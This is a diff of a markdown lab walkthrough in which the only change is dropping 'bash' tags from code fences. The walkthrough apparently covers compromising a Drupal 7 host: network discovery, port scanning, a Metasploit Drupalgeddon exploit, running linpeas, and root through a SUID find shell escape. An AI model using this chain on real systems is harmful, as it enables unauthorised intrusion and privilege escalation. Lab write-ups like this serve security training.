@@ -43,7 +43,7 @@ Make sure you have these tools installed on your attack machine (Kali / Parrot /
 
 We use a simple network discovery tool to find machines on the LAN. This discovers live hosts and their MAC addresses.
 
-```bash
+```
 # Discover hosts on the local network (run as root or with sudo where required)
 sudo netdiscover
 ```
@@ -61,7 +61,7 @@ sudo netdiscover
 
 Scan the discovered IP for open ports and services.
 
-```bash
+```
 # Fast port scan using rustscan (adjust flags/options as needed)
 rustscan -a 192.168.0.119
 ```
@@ -98,7 +98,7 @@ A login page or clues about the web application framework. In this case, the sit
 
 Search for known vulnerabilities for the detected application/version. On Kali you can use `searchsploit`.
 
-```bash
+```
 # Search local ExploitDB for "drupal 7"
 searchsploit "drupal 7"
 ```
@@ -112,7 +112,7 @@ searchsploit "drupal 7"
 
 Open Metasploit and search for a Drupal 7 module.
 
-```bash
+```
 # run msfconsole
 msfconsole
 
@@ -122,7 +122,7 @@ search drupal 7
 
 If you find a module that matches, use it and configure the target:
 
-```bash
+```
 # example Metasploit flow (run inside msfconsole)
 use <module_index_or_path>     # e.g., use exploit/unix/webapp/drupal_drupalgeddon
 set RHOSTS 192.168.0.119
@@ -139,7 +139,7 @@ Metasploit automates exploiting a known vulnerability. A successful exploit can 
 
 If you have a meterpreter session, spawn a system shell. If you only have a basic shell, upgrade it to a proper interactive bash shell.
 
-```bash
+```
 # From meterpreter session:
 shell
 
@@ -162,7 +162,7 @@ This indicates you are the web server user (`www-data`) on the target.
 
 Automated scripts like `linpeas.sh` can highlight common privilege escalation vectors (SUID binaries, dangerous file permissions, misconfigured sudo, weak services, etc). Download and run linpeas **only from the official repo**.
 
-```bash
+```
 # move to /tmp (or another writable dir)
 cd /tmp
 
@@ -200,7 +200,7 @@ The `s` in the permissions (`rws`) denotes the SUID bit — if this `find` binar
 
 If `find` is available to you under SUID or as a sudo NOPASSWD command, a common technique (used in labs) is to execute a shell from `find`:
 
-```bash
+```
 # From a writable directory or the target path
 find . -exec /bin/sh \; -quit
 ```
@@ -210,7 +210,7 @@ find . -exec /bin/sh \; -quit
 
 **After running:**
 
-```bash
+```
 # whoami
 root
 ```
